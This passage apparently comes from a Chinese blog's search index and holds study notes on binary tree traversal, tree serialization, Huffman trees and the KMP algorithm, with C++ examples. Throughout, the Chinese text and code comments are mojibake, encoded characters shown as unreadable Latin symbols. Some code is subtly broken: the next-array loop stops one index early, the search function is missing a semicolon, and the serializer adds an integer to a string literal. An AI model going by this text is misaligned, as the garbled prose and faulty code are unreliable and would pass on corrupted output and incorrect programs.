æœ€åè¯»å³è¾¹çš„å°ä¸‰è§’å½¢ã€‚\n\n\n\næ³¨æ„ï¼Œæ‰€æœ‰çš„ç»“ç‚¹éå†æ­¤æ—¶æ­¤åˆ»éƒ½è¦éµå¾ªå…¶é€’å½’ç®—æ³•çš„è§„åˆ™ï¼Œ**æ‰€æœ‰èŠ‚ç‚¹**ï¼Œå¿…é¡»éƒ½æ˜¯å·¦æ•°-å³æ•°ï¼Œè¯»å–æ ¹ç»“ç‚¹çš„æ­¥éª¤æ’å…¥å…¶ä¸­ï¼Œå½¢æˆä¸€ç§é€’å½’è°ƒç”¨ã€‚**ä»åº•éƒ¨ä¸‰è§’å½¢æ¨¡å¼è¯»å–**ã€‚\n![](/images/æ ‘/8b03e03cd81aad2ff9cad991ccb8a26.jpg)\n\né€šè¿‡è®¡ç®—äºŒå‰æ ‘çš„é«˜åº¦ï¼Œå¯ç”¨ååºéå†å·¦å­æ ‘+å³å­æ ‘ï¼Œå¾—åˆ°ä¸¤ä¸ªé«˜åº¦çš„æœ€é«˜ä½œä¸ºæ ‘çš„é«˜åº¦ã€‚\n\n#### è¡¨è¾¾å¼æ ‘\nå‰ç¼€å’Œåç¼€å’Œä¸­ç¼€è¯»å–ã€‚\n![](/images/æ ‘/2f6c1ef937715be115536a6046ece48.jpg)\næœ¬è´¨ä¸Šæ˜¯æ ˆ+é€’å½’çš„è¯»å–ã€‚\n\n#### éå†çš„éé€’å½’ç®—æ³•\nä¹Ÿæœ‰éé€’å½’çš„è½¬åŒ–ç®—æ³•ï¼Œæœ¬è´¨è¿˜æ˜¯åˆ©ç”¨é€’å½’çš„æœ¬è´¨ï¼Œæ ˆã€‚\n```cpp\n//å‰åºéå†\nvoid preorder(TreeNode* root) {\n    if (!root) return;\n    stack<TreeNode*> s;\n    s.push(root);\n    while (!s.empty()) {\n        TreeNode* node = s.top();\n        s.pop();\n        cout << node->val << \" \";  // è®¿é—®å½“å‰èŠ‚ç‚¹\n        if (node->right) s.push(node->right); // å…ˆå‹å³\n        if (node->left) s.push(node->left);   // å†å‹å·¦ï¼Œä¿è¯å·¦å­æ ‘å…ˆå‡ºæ¥\n    }\n}\n\n//ä¸­åºéå†\nvoid inorder(TreeNode* root) {\n    stack<TreeNode*> s;\n    TreeNode* curr = root;\n    while (curr || !s.empty()) {\n        while (curr) { // å…ˆæŠŠå·¦å­æ ‘å‹æ ˆ\n            s.push(curr);\n            curr = curr->left;\n        }\n        curr = s.top();\n        s.pop();\n        cout << curr->val << \" \"; // è®¿é—®å½“å‰èŠ‚ç‚¹\n        curr = curr->right; // è½¬å‘å³å­æ ‘\n    }\n}\n\n//ååºéå†\nvoid postorder(TreeNode* root) {\n    if (!root) return;\n    stack<TreeNode*> s1, s2;\n    s1.push(root);\n    while (!s1.empty()) {\n        TreeNode* node = s1.top();\n        s1.pop();\n        s2.push(node); // å…ˆå‹å…¥ç¬¬äºŒä¸ªæ ˆ\n        if (node->left) s1.push(node->left);  // å…ˆå‹å·¦\n        if (node->right) s1.push(node->right); // åå‹å³\n    }\n    while (!s2.empty()) {\n        cout << s2.top()->val << \" \"; // è®¿é—®é¡ºåºå°±æ˜¯ å·¦ â†’ å³ â†’ æ ¹\n        s2.pop();\n    }\n}//åˆ©ç”¨\n\n```\n\nä¹Ÿå¯ä»¥è€ƒè™‘é˜Ÿåˆ—æ¥å†™ã€‚\n```cpp\nvoid levelOrder(TreeNode* root) {\n    if (!root) return;\n    queue<TreeNode*> q;\n    q.push(root);\n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        cout << node->val << \" \"; // è®¿é—®å½“å‰èŠ‚ç‚¹\n        if (node->left) q.push(node->left);  // å…ˆå…¥å·¦å­èŠ‚ç‚¹\n        if (node->right) q.push(node->right); // å†å…¥å³å­èŠ‚ç‚¹\n    }\n}\n//é˜Ÿåˆ—queueç”¨äºå±‚åºéå†\n```\n\n#### äºŒå‰æ ‘çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\nåºåˆ—åŒ–ï¼šéå†ï¼Œå¾—åˆ°ç»“ç‚¹çš„çº¿æ€§åºåˆ—ï¼Œè½¬åŒ–æˆçº¿æ€§ç»“æ„ç”¨äºçº¿æ€§è¡¨çš„å­˜å‚¨ã€‚\nååºåˆ—åŒ–ï¼šæ ¹æ®çº¿æ€§åºåˆ—é‡æ„åŸå§‹çš„äºŒå‰æ ‘ã€‚\nå¾€å¾€\nå‰è€…åŸºäºéå†ç®—æ³•ï¼Œåè€…ä¾ç„¶å¾—ç”¨æ ˆæ¥è¿˜åŸã€‚\n>ç»å…¸é—®é¢˜ï¼šç”¨å‰åºéå†å’Œä¸­åºéå†ç»“æœé‡æ„äºŒå‰æ ‘ï¼Œåˆ†æé‡æ„æ¡ä»¶å’Œç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ã€‚\n>çŸ¥é“ä¸¤ä¸ªéå†ï¼Œå¾—åˆ°çœŸæ­£çš„äºŒå‰æ ‘ç»“æœã€‚\n\n##### å‰åºéå†åºåˆ—åŒ–&ååºåˆ—åŒ–\néƒ½åˆ©ç”¨äº†é€’å½’æ¥è¿˜åŸï¼Œå°†å­—ç¬¦ä¸²ä¸æ•°æ®çš„äº’ç›¸è½¬åŒ–ã€‚\nåŸºäºå‰åºéå†ã€‚\n```cpp\n//åºåˆ—åŒ–\nvoid serialize(TreeNode* root, string& s) {\n    if (!root) {\n        s += \"#,\";\n        return;\n    }\n    s += root->val + \",\"; // è®¿é—®æ ¹\n    serialize(root->left, s);  // é€’å½’å·¦å­æ ‘\n    serialize(root->right, s); // é€’å½’å³å­æ ‘\n}\n//ååºåˆ—åŒ–\nTreeNode* deserialize(istringstream& ss) {\n    string val;\n    getline(ss, val, ',');\n    if (val == \"#\") return nullptr; // ç©ºèŠ‚ç‚¹\n\n    TreeNode* node = new TreeNode(val); \n    node->left = deserialize(ss);\n    node->right = deserialize(ss);\n    return node;\n}\n```\n\n##### å±‚åºéå†åºåˆ—åŒ–&ååºåˆ—åŒ–\nåˆ©ç”¨é˜Ÿåˆ—queueã€‚\n```cpp\nstring serialize(TreeNode* root) {\n    if (!root) return \"#\";\n    queue<TreeNode*> q;\n    q.push(root);\n    string res = \"\";\n    \n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        if (node) {\n            res += node->val + \",\";\n            q.push(node->left);\n            q.push(node->right);\n        } else {\n            res += \"#,\";\n        }\n    }\n    return res;\n}\n\n//ååºåˆ—åŒ–\nTreeNode* deserialize(string data) {\n    if (data == \"#\") return nullptr;\n    istringstream ss(data);\n    string val;\n    getline(ss, val, ',');\n    \n    TreeNode* root = new TreeNode(val);\n    queue<TreeNode*> q;\n    q.push(root);\n    \n    while (!q.empty()) {\n        TreeNode* node = q.front();\n        q.pop();\n        \n        if (getline(ss, val, ',')) {\n            if (val != \"#\") {\n                node->left = new TreeNode(val);\n                q.push(node->left);\n            }\n        }\n        if (getline(ss, val, ',')) {\n            if (val != \"#\") {\n                node->right = new TreeNode(val);\n                q.push(node->right);\n            }\n        }\n    }\n    return root;\n}\n```\n\n## æœ€ä¼˜äºŒå‰æ ‘ï¼ˆå“ˆå¤«æ›¼æ ‘ï¼‰\n### å¸¦æƒäºŒå‰æ ‘\næ¯ä¸ªç»“ç‚¹å¸¦æœ‰ä¸€ä¸ªæƒé‡å€¼ã€‚\n![](/images/æ ‘/79dfdcf215f8727742cec5f2837eadd.jpg)\n#### å¸¦æƒè·¯å¾„é•¿åº¦\n**WPL=w1l1+w2l2+....+wnln**\nå¸¦æƒè·¯å¾„é•¿åº¦æœ€å°çš„äºŒå‰æ ‘ï¼Œæˆä¸ºæœ€ä¼˜äºŒå‰æ ‘ï¼Œå³å“ˆå¤«æ›¼æ ‘ã€‚\n![](/images/æ ‘/a52bfc7abd4ed7949cebcafed828d45.jpg)\n\n### åŸºæœ¬æ€§è´¨\nå®šç†1ï¼š**æœ€ä¼˜äºŒå‰æ ‘ä¸€å®šæ˜¯æ»¡äºŒå‰æ ‘ã€‚**\nå®šç†2ï¼š æœ€ä¼˜äºŒå‰æ ‘ä¸­ï¼Œå¦‚æœä¸¤ä¸ªå¶ç»“ç‚¹çš„æƒé‡å€¼ä¸åŒï¼Œ**åˆ™æƒé‡å€¼å°çš„å¶ç»“ç‚¹ä¸­çš„æ ‘çš„å±‚æ•°ï¼Œå¤§äºç­‰äºæƒé‡å€¼å¤§çš„å¶èŠ‚ç‚¹**ã€‚ \n### å“ˆå¤«æ›¼ç®—æ³•\nä¸€ä¸ªè‡³ä¸‹è€Œä¸Šçš„æ„å»ºæœ€ä¼˜äºŒå‰æ ‘çš„æ–¹æ³•ï¼Œé€šè¿‡ä¸æ–­åˆå¹¶ä¸¤ä¸ªå¸¦æƒäºŒå‰æ ‘ï¼Œæœ€ç»ˆç”Ÿæˆæœ€ä¼˜äºŒå‰æ ‘ã€‚\n![](/images/æ ‘/b048c8f0ebcb2a15146ee9a05a5ed74.jpg)\n### æ„å»ºå“ˆå¤«æ›¼æ ‘\næ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n```cpp\n//åˆ›å»ºå“ˆå¤«æ›¼æ ‘ä»£ç \nstruct Node {\n    char ch;        // å­—ç¬¦\n    int freq;       // é¢‘ç‡ï¼ˆæƒå€¼ï¼‰\n    Node *left, *right;\n\n    // æ„é€ å‡½æ•°\n    Node(char c, int f) : ch(c), freq(f), left(nullptr), right(nullptr) {}\n};\n\n// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ˆä¼˜å…ˆé˜Ÿåˆ—é»˜è®¤å¤§æ ¹å †ï¼Œæˆ‘ä»¬éœ€è¦å°æ ¹å †ï¼‰\nstruct Compare {\n    bool operator()(Node* a, Node* b) {\n        return a->freq > b->freq;  // é¢‘ç‡å°çš„ä¼˜å…ˆ\n    }\n};\n\n// æ„é€ å“ˆå¤«æ›¼æ ‘\nNode* buildHuffmanTree(vector<pair<char, int>> freqList) {\n    priority_queue<Node*, vector<Node*>, Compare> pq;\n\n    // åˆå§‹åŒ–ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆæœ€å°å †ï¼‰\n    for (auto& it : freqList) {\n        pq.push(new Node(it.first, it.second));\n    }\n\n    // æ„å»ºå“ˆå¤«æ›¼æ ‘\n    while (pq.size() > 1) {\n        Node* left = pq.top(); pq.pop();\n        Node* right = pq.top(); pq.pop();\n\n        // åˆ›å»ºæ–°èŠ‚ç‚¹ï¼ˆåˆå¹¶ä¸¤ä¸ªæœ€å°èŠ‚ç‚¹ï¼‰\n        Node* parent = new Node('\\0', left->freq + right->freq);\n        parent->left = left;\n        parent->right = right;\n\n        // æ’å…¥æ–°èŠ‚ç‚¹åˆ°ä¼˜å…ˆé˜Ÿåˆ—\n        pq.push(parent);\n    }\n\n    // æœ€ç»ˆæ ¹èŠ‚ç‚¹å°±æ˜¯å“ˆå¤«æ›¼æ ‘çš„æ ¹\n    return pq.top();\n}\n\n```\n### å“ˆå¤«æ›¼æ ‘åº”ç”¨\n#### å“ˆå¤«æ›¼ç¼–ç \nå°†æ–‡æœ¬å­—ç¬¦ä¸²è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ç¼–ç ã€‚\nåœ¨ä¸€èˆ¬æ–¹æ¡ˆé‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨å®šé•¿ç ï¼Œè§„å®šascllç ä¸­çš„æ¯ä¸ªå­—ç¬¦çš„ç¼–å·ã€‚ä½†æˆ‘ä»¬è¿™æ ·çš„è¯ç©ºé—´èŠ±é”€å¤§ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸å®šé•¿ç æ¥æé«˜æ•ˆç‡ã€‚\n##### ä¸å®šé•¿ç \nä½¿ç”¨é¢‘ç‡é«˜çš„å­—ç¬¦é‡‡ç”¨çŸ­ç¼–ç ï¼Œé¢‘ç‡ä½çš„å­—ç¬¦é‡‡ç”¨é•¿ç¼–ç ã€‚\n###### å‰ç¼€ç \nä¸€ç§å¸¸ç”¨çš„ä¸å®šé•¿ç ï¼Œæ¯ä¸ªå­—æ¯çš„ç¼–ç éƒ½ä¸æ˜¯å…¶ä»–å­—æ¯ç¼–ç çš„å‰ç¼€ã€‚\nï¼ˆè¿™æ ·çš„ç¼–ç å¯ä»¥é¿å…è¯»å–çš„æ­§ä¹‰ï¼Œæ¯”å¦‚1101ï¼Œå¯ä»¥çœ‹ä½œ1 101ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œ11 01ï¼Œè¿™æ ·çš„æ­§ä¹‰éœ€è¦é¿å…ã€‚ï¼‰\n**æ„é€ ç¤ºä¾‹**ï¼š\n![](/images/æ ‘/a0149c452deca71987867fcefd399cd.jpg)\nå…¶å®è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚æˆ‘ä»¬å¯ä»¥ç®—ç¼–ç é•¿åº¦çš„åŠ æƒå¹³å‡æ•°ï¼Œå³å¹³å‡ç é•¿ã€‚\nPä¸ºå‡ºç°é¢‘ç‡ï¼ŒWä¸ºç é•¿ã€‚\n$$\n\\bar{W}= \\frac{1}{n}\\sum_{i=1}^{n} (P(i)*W(i))\n$$\n\n## æ ‘è¡¨ç¤ºæ³•\n### çˆ¶æŒ‡é’ˆè¡¨ç¤ºæ³•\nä¿å­˜çˆ¶èŠ‚ç‚¹çš„ç´¢å¼•ã€‚\n![](/images/æ ‘/fd75aeae4ccae8845829ade83c135d7.jpg)\nä¸€èˆ¬ç”¨äºå®ç°å¹¶æŸ¥é›†ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(H)ï¼ŒHä¸ºæ ‘çš„é«˜åº¦ã€‚\n\n### å­©å­è¡¨ç¤ºæ³•\nå­˜å‚¨çš„æ˜¯ç»“ç‚¹æ‰€æœ‰çš„å­©å­ï¼Œæ˜¯ä¸€ä¸ªå­èŠ‚ç‚¹é“¾è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤´æŒ‡é’ˆã€‚\nå„ä¸ªå­èŠ‚ç‚¹æŒ‰ä»å·¦å‘å³çš„é¡ºåºæ’åˆ—ã€‚\n![](/images/æ ‘/6001222e3a5c9ba14b6cdd93fe1530e.jpg)\n### å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•\nå¸¸å¸¸ä½¿ç”¨**äºŒå‰é“¾è¡¨**å®ç°ã€‚æ¯ä¸ªèŠ‚ç‚¹å­˜æ”¾å®ƒçš„ç¬¬ä¸€ä¸ªå­©å­å’Œå®ƒçš„ä¸‹ä¸€ä¸ªå…„å¼Ÿçš„ä¿¡æ¯ã€‚\nå…¶å®è¿™ä¸ªæ˜¯æœ€ç›´è§‚è¡¨ç°æ ‘ç»“æ„çš„ï¼Œå…„å¼Ÿä¿¡æ¯ä»£è¡¨æ‰€åœ¨å±‚ï¼Œå­©å­ä¿¡æ¯æŒ‡å‘ä¸‹ä¸€å±‚ã€‚\n![](/images/æ ‘/4fb17c82d96e8f451b97cf62689314e.jpg)\n## æ ‘ä¸äºŒå‰æ ‘ä¸æ£®æ—çš„è½¬æ¢\n![](/images/æ ‘/Pasted%20image%2020250320090033.png)\n![](/images/æ ‘/Pasted%20image%2020250320090130.png)\n## æ ‘å’Œæ£®æ—çš„éå†\næ ‘å’Œæ£®æ—çš„éå†éƒ½åªæœ‰å‰åºéå†å’Œååºéå†ï¼Œ**æ— ä¸­åºéå†**ã€‚\nè§„åˆ™ç›¸åŒï¼Œéƒ½æ˜¯ä»å·¦åˆ°å³ï¼Œä¾æ¬¡éå†ã€‚\n**æ ‘å’Œæ£®æ—**çš„å‰åºéå†ä¸äºŒå‰æ ‘çš„å‰åºéå†ç›¸åŒï¼Œ**ååºéå†ä¸äºŒå‰æ ‘çš„ä¸­åºéå†ç›¸åŒ**ï¼Œéå†æ—¶é—´å¤æ‚åº¦ä¸äºŒå‰æ ‘ä¸€æ ·ï¼Œéƒ½æ˜¯O(n)ã€‚\n![](/images/æ ‘/Pasted%20image%2020250320090331.png)\n![](/images/æ ‘/Pasted%20image%2020250320090848.png)\n\n---\n","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"KMPç®—æ³•","url":"/2025/03/19/xue-xi/shu-ju-jie-gou/kmp-suan-fa/","content":"# KMPç®—æ³•\n\næˆ‘è§‰å¾—è¿˜åšä¸å‡ºé¢˜ï¼Œæƒ³ä¸é€šæºç ï¼Œå…ˆæ”¾ç€ï¼Œwikiåœ¨è¿™é‡Œï¼š[KMPç®—æ³•](https://oi-wiki.org/string/kmp/)\n\n## åŸºæœ¬æ¦‚å¿µ-nextæ•°ç»„\n\nå‰ç¼€ï¼š**ä¸å«æœ€åä¸€ä¸ªå­—ç¬¦ä½†åŒ…å«ç¬¬ä¸€ä¸ªå­—ç¬¦**çš„ æ‰€æœ‰å­—ä¸²\nåç¼€ï¼š**ä¸å«ç¬¬ä¸€ä¸ªå­—ç¬¦ä½†åŒ…å«æœ€åä¸€ä¸ªå­—ç¬¦**ï¼Œçš„ æ‰€æœ‰å­—ä¸²\nå‰ç¼€è¡¨ next ï¼šä»£è¡¨ p[0:i] å³ p çš„å‰ i+1 çš„å­—ç¬¦ï¼Œæœ€é•¿ç›¸ç­‰å‰åç¼€çš„é•¿åº¦,å³**å‰åç¼€çš„æœ€é•¿ç›¸åŒå­—ä¸²çš„é•¿åº¦**ã€‚\nå¦‚ï¼š\n![](/images/KMPç®—æ³•/Pasted%20image%2020250318153118.png)\nå‡è®¾æ¨¡å¼ä¸² `P = \"ABABCABAA\"`ï¼Œæˆ‘ä»¬æ¥è®¡ç®— `next` æ•°ç»„ã€‚\n\n| ä½ç½® `i` | P[i] | `P[0:i]` (å­ä¸²) | `next[i]` | è§£é‡Š                        |\n| ------ | ---- | ------------- | --------- | ------------------------- |\n| 0      | A    | A             | 0         | åªæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œæ— å‰åç¼€               |\n| 1      | B    | AB            | 0         | \"A\"ï¼ˆå‰ç¼€ï¼‰ â‰  \"B\"ï¼ˆåç¼€ï¼‰         |\n| 2      | A    | ABA           | 1         | \"A\"ï¼ˆå‰ç¼€ï¼‰= \"A\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 1     |\n| 3      | B    | ABAB          | 2         | \"AB\"ï¼ˆå‰ç¼€ï¼‰= \"AB\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 2   |\n| 4      | C    | ABABC         | 0         | \"ABAB\" â‰  \"BABC\"ï¼Œæ— ç›¸ç­‰å‰åç¼€    |\n| 5      | A    | ABABCA        | 1         | \"A\"ï¼ˆå‰ç¼€ï¼‰= \"A\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 1     |\n| 6      | B    | ABABCAB       | 2         | \"AB\"ï¼ˆå‰ç¼€ï¼‰= \"AB\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 2   |\n| 7      | A    | ABABCABA      | 3         | \"ABA\"ï¼ˆå‰ç¼€ï¼‰= \"ABA\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 3 |\n| 8      | A    | ABABCABAA     | 1         | \"A\"ï¼ˆå‰ç¼€ï¼‰= \"A\"ï¼ˆåç¼€ï¼‰ï¼Œé•¿åº¦ 1     |\n\n---\n\nå¦‚ä½•æ„å»ºå‘¢ï¼Ÿå¯ä»¥ç”¨ä¸€ä¸ªå¾ªç¯ï¼Œä¸€ä¸ªå…ˆè®¡ç®—å‰ç¼€æœ€é•¿çš„é•¿åº¦ï¼Œå¦‚æœå¤±é…å°±é‡æ–°ç§»åŠ¨å­—ç¬¦åŒ¹é…ï¼Œä¿ç•™æœ€å¤§å€¼ã€‚\nå®ç°ï¼š\nè¿™é‡Œå‚è€ƒ[KMPç®—æ³•nextæ•°ç»„çš„ä¼˜åŒ–è¿‡ç¨‹](https://oi-wiki.org/string/kmp/#%E8%BF%87%E7%A8%8B_1)\n\n```cpp\nvector<int>Next(const string &p){\n\tint m=p.size();\n\tvector<int>next(m,0);\n\tint j=0;\n\n\t for(int i=1;i<m-1;i++){\n\t\t while(j>0 && p[i]!=p[j]){\n\t\t\t j=next[j-1];//å¤±é…ï¼Œå˜æˆå‰ä¸€ä¸ªåŒ¹é…çš„ä½ç½®ã€‚\n\t\t }\n\t\t if(p[i]==p[j]) j++;//é…å¯¹ï¼Œè®°å½•æœ€é•¿é•¿åº¦å¢åŠ \n\t\t next[i]=j;\n\t }\n\t return next;\n\t}\n```\n## KMPç®—æ³•æ¯”è¾ƒ\n\n>ç»™å®šä¸€ä¸ªæ–‡æœ¬ t å’Œä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œæˆ‘ä»¬å°è¯•æ‰¾åˆ°å¹¶å±•ç¤º s åœ¨ t ä¸­çš„æ‰€æœ‰å‡ºç°ï¼ˆoccurrenceï¼‰ã€‚ \n>ä¸ºäº†ç®€ä¾¿èµ·è§ï¼Œæˆ‘ä»¬ç”¨ n è¡¨ç¤ºå­—ç¬¦ä¸² s çš„é•¿åº¦ï¼Œç”¨ m è¡¨ç¤ºæ–‡æœ¬ t çš„é•¿åº¦ã€‚ æˆ‘ä»¬æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸² s + # + tï¼Œå…¶ä¸­ # ä¸ºä¸€ä¸ªæ—¢ä¸å‡ºç°åœ¨ s ä¸­ä¹Ÿä¸å‡ºç°åœ¨ t ä¸­çš„åˆ†éš”ç¬¦ã€‚æ¥ä¸‹ æ¥è®¡ç®—è¯¥å­—ç¬¦ä¸²çš„å‰ç¼€å‡½æ•°ã€‚\n>ç°åœ¨è€ƒè™‘è¯¥å‰ç¼€å‡½æ•°é™¤å»æœ€å¼€å§‹ n + 1 ä¸ªå€¼ï¼ˆå³å±äºå­—ç¬¦ä¸² s å’Œåˆ† éš”ç¬¦çš„å‡½æ•°å€¼ï¼‰åå…¶ä½™å‡½æ•°å€¼çš„æ„ä¹‰ã€‚æ ¹æ®å®šä¹‰ï¼Œnext[i] ä¸ºå³ç«¯ç‚¹åœ¨ i ä¸”åŒæ—¶ä¸ºä¸€ä¸ªå‰ç¼€çš„æœ€é•¿çœŸ å­ä¸²çš„é•¿åº¦ï¼Œå…·ä½“åˆ°æˆ‘ä»¬çš„è¿™ç§æƒ…å†µä¸‹ï¼Œå…¶å€¼ä¸ºä¸ s çš„å‰ç¼€ç›¸åŒä¸”å³ç«¯ç‚¹ä½äº i çš„æœ€é•¿å­ä¸²çš„é•¿ åº¦ã€‚ç”±äºåˆ†éš”ç¬¦çš„å­˜åœ¨ï¼Œè¯¥é•¿åº¦ä¸å¯èƒ½è¶…è¿‡ nã€‚è€Œå¦‚æœç­‰å¼ next[i] = n æˆç«‹ï¼Œåˆ™æ„å‘³ç€ s å®Œæ•´å‡ºç° åœ¨è¯¥ä½ç½®ï¼ˆå³å…¶å³ç«¯ç‚¹ä½äºä½ç½® iï¼‰ã€‚æ³¨æ„è¯¥ä½ç½®çš„ä¸‹æ ‡æ˜¯å¯¹å­—ç¬¦ä¸² s + # + t è€Œè¨€çš„ã€‚ å› æ­¤å¦‚æœåœ¨æŸä¸€ä½ç½® i æœ‰ Ï€[i] = n æˆç«‹ï¼Œåˆ™å­—ç¬¦ä¸² s åœ¨å­—ç¬¦ä¸² t çš„ i âˆ’ (n âˆ’ 1) âˆ’ (n + 1) = i âˆ’ 2n å¤„å‡ºç°ã€‚\n\nè¿™æ˜¯oierç®—æ³•ï¼Œå…¶å®æˆ‘æƒ³ä¸å‡ºæ¥ï¼š\n```cpp\nvector<int>search(string t,string s){\n\tstring cur = s+'#'+t;\n\tint sz1=t.size(),sz2=s.size();\n\tvector<int> v;\n\tvector<int>next=Next(cur)\n\tfor(int i=sz2+1;i<=sz2+sz1;i++){\n\t\tif(next[i]==sz2) v.push_back(i-2*sz2);\n\t}\n\treturn v;\n}\n```\nKMP ç®—æ³•çš„æƒ³æ³•æ˜¯ï¼šè®¾æ³•åˆ©ç”¨è¿™ä¸ªå·²çŸ¥ä¿¡æ¯ï¼Œä¸è¦æŠŠã€Œæœç´¢ä½ç½®ã€ç§»å›å·²ç»æ¯”è¾ƒè¿‡çš„ä½ç½®ï¼Œç»§ç»­æŠŠå®ƒå‘åç§»ï¼Œè¿™æ ·å°±æé«˜äº†æ•ˆç‡ã€‚\næ•´ä¸ª KMP ç®—æ³•ä¸­æ ¸å¿ƒä¸”éš¾ç†è§£çš„æ˜¯ï¼š\n1. éƒ¨åˆ†åŒ¹é…è¡¨ä»£ç å®ç°ï¼Œç†è§£ä¸äº†ã€‚åŸç†ç†è§£äº†ï¼Œä½†æ˜¯ä»£ç æƒ³ä¸æ˜ç™½\n2. å½“ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¸æºå­—ç¬¦ä¸²ä¸å›æº¯ï¼Œåªæ ¹æ®éƒ¨åˆ†åŒ¹é…è¡¨ï¼Œç§»åŠ¨å­ä¸²çš„ä¸‹æ ‡ï¼Œè®©å­ä¸²å›æº¯ã€‚\n\næ‰€ä»¥ç”¨ç®€å•çš„æ¨¡æ‹Ÿçš„è¯ï¼Œæ˜¯è¿™æ ·çš„ï¼š\n```cpp\nvector<int>KMP(string s,string p){\nÂ  Â  int sz1=s.size(),sz2=p.size();\nÂ  Â  vector<int>Next=getnext(p);\nÂ  Â  vector<int>v;\nÂ  Â  for(int i=0,j=0;i<sz1;i++){\nÂ  Â  Â  Â  if(s[i]==p[j]){\nÂ  Â  Â  Â  Â  Â  j++;\nÂ  Â  Â  Â  }\nÂ  Â  Â  Â  Â else if(j>0){\nÂ  Â  Â  Â  Â  Â  j=Next[j-1];\nÂ  Â  Â  Â  Â  Â  i--;//è¿™é‡Œå›æº¯jï¼Œæ˜¯KMPç®—æ³•çš„æ ¸å¿ƒæ€è·¯ã€‚\nÂ  Â  Â  Â  }\nÂ  Â  Â  Â  if(j==sz2){\nÂ  Â  Â  Â  Â  Â  v.push_back(i-j+1);\nÂ  Â  Â  Â  Â  Â  j=Next[j-1];\nÂ  Â  Â  Â  }\nÂ  Â  }\nÂ  Â  return v; Â  Â \n}\n```\nç”¨ for æ¥ä¸€ä¸ªä¸€ä¸ªåŒ¹é…éƒ½æ‡‚ï¼Œè¿™é‡Œ KMP ç®—æ³•æ ¸å¿ƒå°±ç®—é‚£ä¸ªå›æº¯ j å’Œ push_back(i-j+1) ã€‚\nè‡³äºä¸ºä»€ä¹ˆéœ€è¦å›æº¯`j`ï¼Œè¿™æ˜¯KMPç®—æ³•çš„æ ¸å¿ƒæ€æƒ³ï¼Œè®©æˆ‘è§£é‡Šä¸€ä¸‹ï¼š\n### ä¸ºä»€ä¹ˆè¦å›æº¯jçš„åŸå› \nå½“æˆ‘ä»¬åœ¨åŒ¹é…è¿‡ç¨‹ä¸­é‡åˆ°ä¸åŒ¹é…çš„å­—ç¬¦æ—¶ï¼Œä¼ ç»Ÿçš„å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•ä¼šå°†æ¨¡å¼ä¸²å®Œå…¨é‡ç½®åˆ°å¼€å§‹ä½ç½®ï¼Œç„¶åä¸»ä¸²å‘å‰ç§»åŠ¨ä¸€ä½é‡æ–°å¼€å§‹åŒ¹é…ã€‚è¿™æ ·ä¼šå¯¼è‡´å¾ˆå¤šå·²ç»æ¯”è¾ƒè¿‡çš„å­—ç¬¦è¢«é‡æ–°æ¯”è¾ƒï¼Œæ•ˆç‡å¾ˆä½ã€‚\n\nKMPç®—æ³•çš„æ ¸å¿ƒä¼˜åŒ–åœ¨äºï¼š\n **åˆ©ç”¨å·²çŸ¥ä¿¡æ¯**ï¼šå½“åŒ¹é…å¤±è´¥æ—¶ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†æ¨¡å¼ä¸²çš„å‰jä¸ªå­—ç¬¦ä¸ä¸»ä¸²çš„ç›¸åº”éƒ¨åˆ†æ˜¯åŒ¹é…çš„ã€‚\n **é¿å…é‡å¤å·¥ä½œ**ï¼šæˆ‘ä»¬ä¸éœ€è¦å®Œå…¨å›åˆ°æ¨¡å¼ä¸²çš„èµ·å§‹ä½ç½®ï¼Œè€Œæ˜¯å¯ä»¥è·³åˆ°ä¸€ä¸ªä¸­é—´ä½ç½®ï¼Œè¿™ä¸ªä½ç½®ç”±Nextæ•°ç»„å†³å®šã€‚\n **Nextæ•°ç»„çš„å«ä¹‰**ï¼š`Next[j-1]`è¡¨ç¤ºå½“æ¨¡å¼ä¸²çš„ç¬¬jä¸ªå­—ç¬¦ä¸åŒ¹é…æ—¶ï¼Œåº”è¯¥å°†æ¨¡å¼ä¸²æŒ‡é’ˆjå›é€€åˆ°å“ªä¸ªä½ç½®ï¼Œä½¿å¾—æ¨¡å¼ä¸²çš„å¼€å¤´éƒ¨åˆ†ä¸ä¸»ä¸²çš„å½“å‰éƒ¨åˆ†æ½œåœ¨åœ°åŒ¹é…ã€‚\n\nç®€å•æ¥è¯´ï¼Œå›æº¯`j`ä½¿æˆ‘ä»¬å¯ä»¥ï¼š\n- å……åˆ†åˆ©ç”¨å·²ç»è·å¾—çš„éƒ¨åˆ†åŒ¹é…ä¿¡æ¯\n- é¿å…ä»å¤´å¼€å§‹é‡æ–°åŒ¹é…æ¨¡å¼ä¸²\n- å®ç°çº¿æ€§æ—¶é—´å¤æ‚åº¦çš„å­—ç¬¦ä¸²æŸ¥æ‰¾\n\nè¿™ç§\"èªæ˜åœ°è·³è¿‡\"æ˜¯KMPç®—æ³•æ¯”æœ´ç´ 